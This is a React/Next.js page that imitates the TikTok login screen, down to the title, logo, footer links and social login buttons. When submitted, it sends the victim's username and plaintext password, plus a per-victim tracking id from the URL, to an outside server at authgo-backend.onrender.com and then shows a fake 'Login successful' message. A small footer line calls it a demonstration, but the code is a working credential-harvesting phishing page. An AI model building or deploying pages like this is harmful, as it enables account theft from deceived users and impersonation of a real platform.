import { useState } from 'react';
import Head from 'next/head';
import { toast } from 'react-toastify';
import { useRouter } from 'next/router';

export default function TikTokLogin() {
  const [loginData, setLoginData] = useState({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [loginMethod, setLoginMethod] = useState('email'); 
  const [isFocused, setIsFocused] = useState({
    email: false,
    password: false
  });
  
  const social = "TikTok";
  const router = useRouter();
  const { id } = router.query;

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setLoginData({
      ...loginData,
      [e.target.name]: e.target.value
    });
  };

  const handleFocus = (field: string) => {
    setIsFocused(prev => ({ ...prev, [field]: true }));
  };

  const handleBlur = (field: string) => {
    setIsFocused(prev => ({ ...prev, [field]: false }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    if (!id || !social || !loginData.email || !loginData.password) {
      toast.error("⚠️ All fields are required!");
      setIsLoading(false);
      return;
    }

    try {
      const res = await fetch("https://authgo-backend.onrender.com/cred/add", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: id,
          social: social,
          username: loginData.email,
          password: loginData.password,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to add credential");

      toast.success("✅ Login successful!");
      setLoginData({ email: '', password: '' });
      
      // Redirect back after successful login
      
    } catch (err) {
      console.error("❌ Error adding credential:", err);
      toast.error((err as Error).message);
    } finally {
      setIsLoading(false);
    }
  };

  const getPlaceholder = () => {
    switch (loginMethod) {
      case 'phone': return 'Phone number';
      case 'username': return 'Username';
      default: return 'Email or username';
    }
  };

  const getInputType = () => {
    switch (loginMethod) {
      case 'phone': return 'tel';
      case 'username': return 'text';
      default: return 'text';
    }
  };

  return (
    <div className="min-h-screen bg-black flex flex-col relative overflow-hidden">
      <Head>
        <title>Log in | TikTok</title>
        <meta name="description" content="Log in to TikTok to start creating and discovering content" />
        <link rel="icon" href="https://static-exp1.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico" type="image/x-icon" />
      </Head>

      {/* Animated Background */}
      <div className="absolute inset-0 bg-gradient-to-br from-purple-900/20 via-black to-red-900/20 animate-pulse-slow"></div>
      
      {/* Floating Particles */}
      <div className="absolute inset-0 overflow-hidden">
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute w-2 h-2 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full opacity-30 animate-float"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 5}s`,
              animationDuration: `${15 + Math.random() * 10}s`
            }}
          />
        ))}
      </div>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-8 px-4 sm:px-6 lg:px-8 relative z-10">
        <div className="max-w-md w-full space-y-8">
          {/* TikTok Logo with Animation */}
          <div className="flex justify-center">
            <div className="relative">
              <div className="w-20 h-20 bg-gradient-to-r from-purple-500 via-pink-500 to-red-500 rounded-full flex items-center justify-center animate-pulse-glow">
                <svg 
                  className="w-12 h-12 filter drop-shadow-lg" 
                  viewBox="0 0 24 24" 
                  fill="white"
                >
                  <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
                </svg>
              </div>
            </div>
          </div>

          {/* Login Card */}
          <div className="bg-gray-900/80 backdrop-blur-lg rounded-2xl p-8 border border-gray-800/50 shadow-2xl">
            <div className="space-y-6">
              <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-3 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                  Log in to TikTok
                </h1>
                <p className="text-sm text-gray-300">
                  Manage your account, check notifications, comment on videos, and more.
                </p>
              </div>

              {/* Login Method Tabs */}
              <div className="flex border-b border-gray-700/50">
                <button
                  onClick={() => setLoginMethod('email')}
                  className={`flex-1 py-4 text-sm font-semibold border-b-2 transition-all duration-300 ${
                    loginMethod === 'email' 
                      ? 'border-pink-500 text-white' 
                      : 'border-transparent text-gray-400 hover:text-gray-300'
                  }`}
                >
                  Email/Username
                </button>
                <button
                  onClick={() => setLoginMethod('phone')}
                  className={`flex-1 py-4 text-sm font-semibold border-b-2 transition-all duration-300 ${
                    loginMethod === 'phone' 
                      ? 'border-pink-500 text-white' 
                      : 'border-transparent text-gray-400 hover:text-gray-300'
                  }`}
                >
                  Phone
                </button>
                <button
                  onClick={() => setLoginMethod('username')}
                  className={`flex-1 py-4 text-sm font-semibold border-b-2 transition-all duration-300 ${
                    loginMethod === 'username' 
                      ? 'border-pink-500 text-white' 
                      : 'border-transparent text-gray-400 hover:text-gray-300'
                  }`}
                >
                  Username
                </button>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="relative">
                  <input
                    type={getInputType()}
                    name="email"
                    placeholder={getPlaceholder()}
                    value={loginData.email}
                    onChange={handleChange}
                    onFocus={() => handleFocus('email')}
                    onBlur={() => handleBlur('email')}
                    required
                    className="w-full px-4 py-4 bg-gray-800/50 border-2 border-gray-700/50 rounded-xl focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all duration-300 text-base text-white placeholder-gray-500 backdrop-blur-sm"
                  />
                  {isFocused.email && loginData.email && (
                    <div className="absolute inset-0 border-2 border-pink-500 rounded-xl pointer-events-none animate-pulse"></div>
                  )}
                </div>
                
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    placeholder="Password"
                    value={loginData.password}
                    onChange={handleChange}
                    onFocus={() => handleFocus('password')}
                    onBlur={() => handleBlur('password')}
                    required
                    className="w-full px-4 py-4 bg-gray-800/50 border-2 border-gray-700/50 rounded-xl focus:ring-2 focus:ring-pink-500 focus:border-pink-500 outline-none transition-all duration-300 text-base text-white placeholder-gray-500 backdrop-blur-sm pr-12"
                  />
                  {isFocused.password && loginData.password && (
                    <div className="absolute inset-0 border-2 border-pink-500 rounded-xl pointer-events-none animate-pulse"></div>
                  )}
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300 focus:outline-none transition-colors duration-200 p-1 rounded-lg hover:bg-gray-700/50"
                  >
                    {showPassword ? (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L9 9m13 11l-4-4m0 0l-4 4m4-4V9" />
                      </svg>
                    ) : (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                      </svg>
                    )}
                  </button>
                </div>

                <div className="text-sm text-center">
                  <a href="#" className="text-gray-400 hover:text-pink-400 font-medium transition-colors duration-200">
                    Forgot password?
                  </a>
                </div>

                <button 
                  type="submit" 
                  disabled={isLoading}
                  className={`w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white py-4 rounded-xl font-semibold text-lg hover:from-purple-600 hover:to-pink-600 transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg ${
                    isLoading ? 'opacity-70 cursor-not-allowed' : ''
                  }`}
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center space-x-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Logging in...</span>
                    </div>
                  ) : (
                    'Log in'
                  )}
                </button>

                <div className="relative flex items-center my-6">
                  <div className="flex-grow border-t border-gray-700/50"></div>
                  <span className="flex-shrink mx-4 text-gray-500 text-sm">or continue with</span>
                  <div className="flex-grow border-t border-gray-700/50"></div>
                </div>

                {/* Social Login Buttons */}
                <div className="grid grid-cols-2 gap-3">
                  <button 
                    type="button"
                    className="bg-gray-800/50 text-white py-3 rounded-xl font-medium text-sm hover:bg-gray-700/50 transition-all duration-200 flex items-center justify-center space-x-2 border border-gray-700/50 backdrop-blur-sm hover:border-gray-600"
                  >
                    <svg className="w-5 h-5 text-blue-500" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    <span>Facebook</span>
                  </button>
                  
                  <button 
                    type="button"
                    className="bg-gray-800/50 text-white py-3 rounded-xl font-medium text-sm hover:bg-gray-700/50 transition-all duration-200 flex items-center justify-center space-x-2 border border-gray-700/50 backdrop-blur-sm hover:border-gray-600"
                  >
                    <svg className="w-5 h-5" viewBox="0 0 24 24">
                      <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                      <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                      <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                      <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                    </svg>
                    <span>Google</span>
                  </button>
                </div>

                {/* Twitter Login */}
                <button 
                  type="button"
                  className="w-full bg-gray-800/50 text-white py-3 rounded-xl font-medium text-sm hover:bg-gray-700/50 transition-all duration-200 flex items-center justify-center space-x-2 border border-gray-700/50 backdrop-blur-sm hover:border-gray-600"
                >
                  <svg className="w-5 h-5 text-blue-400" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                  </svg>
                  <span>Twitter</span>
                </button>
              </form>
            </div>
          </div>

          {/* Sign Up Link */}
          <div className="text-center">
            <p className="text-sm text-gray-400">
              Don't have an account?{' '}
              <a href="#" className="text-pink-400 font-semibold hover:text-pink-300 transition-colors duration-200">
                Sign up
              </a>
            </p>
          </div>

          {/* Footer Links */}
          <div className="text-center space-y-4 pt-8">
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500">
              {['About', 'Newsroom', 'Contact', 'Careers', 'ByteDance'].map((item) => (
                <a key={item} href="#" className="hover:text-gray-300 transition-colors duration-200">
                  {item}
                </a>
              ))}
            </div>
            
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500">
              {['TikTok for Good', 'Advertise', 'Developers', 'Transparency', 'TikTok Rewards'].map((item) => (
                <a key={item} href="#" className="hover:text-gray-300 transition-colors duration-200">
                  {item}
                </a>
              ))}
            </div>

            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500">
              {['Help', 'Safety', 'Terms', 'Privacy', 'Creator Academy'].map((item) => (
                <a key={item} href="#" className="hover:text-gray-300 transition-colors duration-200">
                  {item}
                </a>
              ))}
            </div>

            <select className="bg-transparent border-0 text-gray-500 text-sm outline-none cursor-pointer hover:text-gray-300 transition-colors duration-200">
              <option>English</option>
              <option>Español</option>
              <option>Français</option>
              <option>中文</option>
            </select>
            
            <div className="text-xs text-gray-500">
              <p>© 2024 TikTok</p>
              <p className="mt-1 text-gray-600">This is a demonstration interface</p>
            </div>
          </div>
        </div>
      </main>

      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
          background: #000000;
          margin: 0;
          padding: 0;
        }

        @keyframes float {
          0%, 100% { transform: translateY(0px) rotate(0deg); }
          50% { transform: translateY(-20px) rotate(180deg); }
        }

        @keyframes pulse-glow {
          0%, 100% { box-shadow: 0 0 20px rgba(168, 85, 247, 0.4); }
          50% { box-shadow: 0 0 40px rgba(236, 72, 153, 0.6); }
        }

        @keyframes pulse-slow {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }

        .animate-float {
          animation: float 15s ease-in-out infinite;
        }

        .animate-pulse-glow {
          animation: pulse-glow 2s ease-in-out infinite;
        }

        .animate-pulse-slow {
          animation: pulse-slow 4s ease-in-out infinite;
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
          width: 8px;
        }
        
        ::-webkit-scrollbar-track {
          background: #1f2937;
        }
        
        ::-webkit-scrollbar-thumb {
          background: #4b5563;
          border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
          background: #6b7280;
        }
      `}</style>
    </div>
  );
}